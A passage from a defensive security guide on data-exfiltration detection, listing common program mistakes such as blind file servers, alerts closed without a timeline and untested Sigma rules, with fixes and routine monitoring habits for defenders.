Symptom: detections scoped to user endpoints; the file server — where the data lives — was blind.

Root cause: mental model of exfil as “an employee sneaking files out”.

Fix: extend tool-first-seen, proxy, and DNS coverage to all server roles.

Prevention: scope every new detection by asking “where would I stage the data?”

11 · Closing exfil alerts without the timeline

Symptom: the rclone alert was resolved as “admin activity”; ransomware followed six hours later.

Root cause: alerts triaged one at a time, never joined to neighboring events.

Fix: require a 24-hour lookback (process, file, proxy) before closing any upload alert.

Prevention: correlation playbooks for the pre-encryption pattern, exercised quarterly.

12 · Rules deployed but never tested

Symptom: the Sigma rules exist; during the incident they silently failed on a field-name mismatch.

Root cause: no purple-team validation after deployment.

Fix: replay the section 2 lab story end-to-end and fix what does not fire.

Prevention: quarterly detection tests are a standing agenda item, with results recorded.

Habits that keep the program honest

Daily

Review first-seen upload-tool alerts and OAuth consent events. Ten minutes a day keeps the highest-signal feeds fresh and stops backlogs from burying the real case.

Weekly

Check per-host upload-volume dashboards against baseline, and read the week’s category exceptions. Look for one host that moved more bytes than its peers — and be able to say why.

Monthly

Run one purple-team replay of this technique, review CASB unmanaged-app findings, and confirm the approved-app register matches reality. Retire or tune the noisiest rule of the month.

Good practice · Score yourself

Give yourself one point per mistake you can prove does not apply (with evidence, not memory). Programs scoring under nine should start with mistakes 1, 2 and 5 — they unlock everything else.
